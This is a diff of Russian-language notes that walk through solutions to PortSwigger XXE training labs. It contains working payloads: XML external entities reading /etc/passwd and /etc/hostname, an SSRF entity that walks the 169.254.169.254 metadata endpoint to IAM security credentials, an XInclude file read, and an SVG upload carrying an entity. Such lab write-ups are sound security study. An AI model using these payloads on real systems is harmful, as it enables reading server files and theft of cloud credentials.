@@ -9,7 +9,9 @@
 
 5) после объявления xml добавить
 
-' <!DOCTYPE kek [ <!ENTITY res SYSTEM "file:///etc/passwd"> ]> '
+'''xml
+<!DOCTYPE kek [ <!ENTITY res SYSTEM "file:///etc/passwd"> ]> 
+'''
 
 6)заменить product id число на &res; 
 
@@ -21,25 +23,33 @@
 
 5)после объявления xml добавить:
 
-'<!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/"> ]>'
+'''xml
+<!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/"> ]>
+'''
 
 6)заменить product id на &res; отправить запрос, 
 
 7)в ответе придет latest - добавить его к адресу и получим 
 
-'<!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/latest"> ]> 'и так далее, 
+'''xml
+<!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/latest"> ]> 
+'''
+и так далее, 
 
-n+1)в итоге получаем '<!DOCTYPE kek [ <!ENTITY res SYSTEM 
-
-"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>', что и приведёт нас к ответу.
+n+1)в итоге получаем 
+'''xml
+<!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+''', что и приведёт нас к ответу.
 
 3. https://portswigger.net/web-security/xxe/lab-xinclude-attack
 
 те же действия, что и в 1. до пункта 4) 
 
 5)в *product id* вставить 
-'''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
-<xi:include parse="text" href="file:///etc/passwd"/></foo> '''
+'''xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"> 
+<xi:include parse="text" href="file:///etc/passwd"/></foo> 
+'''
 
 6)в ответ придёт /etc/passwd
 
@@ -53,7 +63,8 @@ n+1)в итоге получаем '<!DOCTYPE kek [ <!ENTITY res SYSTEM
 
 5)в поле для картинки вставить: 
 
-'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+'''xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <!DOCTYPE kek [ <!ENTITY res SYSTEM "file:///etc/hostname"> ]>
  <svg  version="1.1" width="1200" height="1200"
         viewBox="0 0 100 100"
@@ -62,9 +73,10 @@ n+1)в итоге получаем '<!DOCTYPE kek [ <!ENTITY res SYSTEM
      xmlns:xlink="http://www.w3.org/1999/xlink"
      xmlns:ev="http://www.w3.org/2001/xml-events">
  <text font-size = "10" y = "16"> &res; </text>
-</svg>'''
+</svg>
+'''
 
-svg части взяты из интернета - видимо что-то типа стандарта,размер задан вручную, ViewBox регулировался так, чтоб было видно текст на картинке, собственно как и размер текста(тоже регулировался)
+6)svg части взяты из интернета - видимо что-то типа стандарта,размер задан вручную, ViewBox регулировался так, чтоб было видно текст на картинке, собственно как и размер текста(тоже регулировался)
 
 
 1. https://portswigger.net/web-security/sql-injection/lab-login-bypass
